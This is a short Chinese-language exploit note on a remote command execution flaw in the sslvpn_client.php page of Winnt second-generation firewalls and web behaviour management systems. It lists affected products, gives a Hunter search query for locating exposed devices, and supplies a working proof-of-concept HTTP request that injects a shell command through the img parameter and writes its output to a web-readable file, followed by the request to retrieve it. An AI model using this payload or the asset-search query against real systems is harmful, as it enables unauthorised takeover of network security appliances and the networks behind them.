# 威努特sslvpn_client存在远程命令执行漏洞

# 一、漏洞简介
威努特防火墙sslvpn_client存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 威努特第二代防火墙
+ 威努特上网行为管理系统

# 三、资产测绘
+ hunter`app.name=="威努特第二代防火墙"`
+ 特征

![1701763255220-b1f2801a-99cf-4b00-908a-e0407077d750.png](./img/r7gYetii6UGZxE7M/1701763255220-b1f2801a-99cf-4b00-908a-e0407077d750-805088.png)

![1701763267244-47dfc2c5-8543-4eba-81fc-85757181229a.png](./img/r7gYetii6UGZxE7M/1701763267244-47dfc2c5-8543-4eba-81fc-85757181229a-036372.png)

# 四、漏洞复现
```java
GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701762310844-e2bb6845-f268-450b-b1ef-4ddc2f30876e.png](./img/r7gYetii6UGZxE7M/1701762310844-e2bb6845-f268-450b-b1ef-4ddc2f30876e-569947.png)

获取命令执行结果

```java
GET /sslvpn/ceshi.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1701762342384-224cbced-19ed-428d-b26d-9957865251d2.png](./img/r7gYetii6UGZxE7M/1701762342384-224cbced-19ed-428d-b26d-9957865251d2-186116.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qg31v0mn53x3w50g>